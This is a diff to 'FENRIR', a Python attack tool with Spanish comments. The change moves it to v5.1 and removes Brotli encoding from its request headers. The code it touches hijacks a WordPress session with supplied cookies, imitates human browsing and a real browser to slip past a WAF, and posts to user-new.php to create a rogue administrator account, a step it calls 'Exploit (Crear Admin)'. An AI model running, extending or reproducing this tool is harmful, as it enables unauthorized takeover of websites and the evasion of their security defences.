@@ -12,7 +12,7 @@ from enum import Enum, auto
 from yarl import URL
 
 # ==============================================================================
-#  🛠️ CONFIGURACIÓN & UTILS (STEALTH MODE)
+#  🛠️ CONFIGURACIÓN & UTILS (NO BROTLI VERSION)
 # ==============================================================================
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
@@ -69,7 +69,7 @@ class TargetConfig:
     cookies: Dict[str, str] = field(default_factory=dict)
 
 # ==============================================================================
-#  🦍 CORE ENGINE: FENRIR v5.0 (STEALTH)
+#  🦍 CORE ENGINE: FENRIR v5.1 (COMPATIBILITY MODE)
 # ==============================================================================
 
 class FenrirEngine:
@@ -78,12 +78,16 @@ class FenrirEngine:
         self.session: Optional[aiohttp.ClientSession] = None
         
     def _get_headers(self, referer: str = None) -> Dict[str, str]:
-        """Genera cabeceras que imitan un navegador real para evitar bloqueos WAF."""
+        """
+        Genera cabeceras que imitan un navegador real.
+        FIX: Eliminado 'br' (Brotli) de Accept-Encoding para evitar errores de decodificación.
+        """
         h = {
             "User-Agent": self.config.user_agent,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
-            "Accept-Encoding": "gzip, deflate, br",
+            # SOLUCIÓN: Solo pedimos gzip o deflate, que Python soporta nativamente.
+            "Accept-Encoding": "gzip, deflate", 
             "Connection": "keep-alive",
             "Upgrade-Insecure-Requests": "1",
             "Sec-Fetch-Dest": "document",
@@ -157,7 +161,7 @@ class FenrirEngine:
 
     async def _exploit_wordpress(self, payload: UserPayload) -> bool:
         """
-        Estrategia WP V5 (Human-Like Behavior):
+        Estrategia WP V5.1 (Human-Like + No Brotli):
         1. Visita Dashboard (generar Referer legítimo).
         2. Navega a User-New con Referer.
         3. Postea con Referer.
@@ -167,7 +171,7 @@ class FenrirEngine:
         dashboard_path = "/wp-admin/"
         target_path = "/wp-admin/user-new.php"
         
-        # PASO 1: WARM-UP (Visitar Dashboard para engañar al WAF)
+        # PASO 1: WARM-UP (Visitar Dashboard para engañar al WAF y obtener Referer)
         print(colorize("   🧠 Simulando navegación humana (Dashboard -> Add User)...", Colors.CYAN))
         async with self.session.get(dashboard_path, headers=self._get_headers()) as resp:
             await resp.text() # Consumir respuesta
@@ -182,7 +186,7 @@ class FenrirEngine:
         async with self.session.get(target_path, headers=stealth_headers) as resp:
             text = await resp.text()
             
-            # Debug snapshot
+            # Debug snapshot por si acaso
             with open("debug_view.html", "w", encoding="utf-8") as f: f.write(text)
 
             # Si nos da 404 pero estamos logueados (tu caso anterior), es un WAF bloqueando.
@@ -228,7 +232,7 @@ class FenrirEngine:
             "createuser": "Add New User"
         }
         
-        # Headers con Referer de user-new.php (como si hubiéramos pulsado el botón)
+        # Headers con Referer de user-new.php (como si hubiéramos pulsado el botón "Crear")
         post_headers = self._get_headers(referer=str(resp.url))
         
         print(colorize(f"   🚀 Ejecutando inyección: {payload.username}...", Colors.YELLOW))
@@ -263,7 +267,7 @@ def parse_raw_cookies(raw_cookie: str) -> Dict[str, str]:
     return cookies
 
 async def main():
-    print(colorize("\n🦍 FENRIR v5.0 - STEALTH MODE 🦍\n", Colors.RED))
+    print(colorize("\n🦍 FENRIR v5.1 - STEALTH MODE (NO BROTLI) 🦍\n", Colors.RED))
 
     url_input = input(">> URL Base: ").strip()
     if not url_input.startswith("http"): url_input = f"http://{url_input}"
@@ -271,7 +275,6 @@ async def main():
     
     print("\n[1] WordPress")
     choice = input(">> Opción: ").strip()
-    # Asumimos WP por defecto para ahorrar tiempo en este caso
     target_type = TargetType.WORDPRESS
 
     print(f"\n{Colors.YELLOW}👉 COOKIE SESSION HIJACK{Colors.RESET}")
@@ -288,7 +291,7 @@ async def main():
     print("   [2] Exploit (Crear Admin)")
     mode = input("   >> ").strip()
 
-    # User Agent de Firefox Linux para coincidir con tu sistema y no levantar sospechas
+    # User Agent de Firefox Linux
     ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
 
     config = TargetConfig(base_url=url_input, type=target_type, user_agent=ua, cookies=cookie_dict)
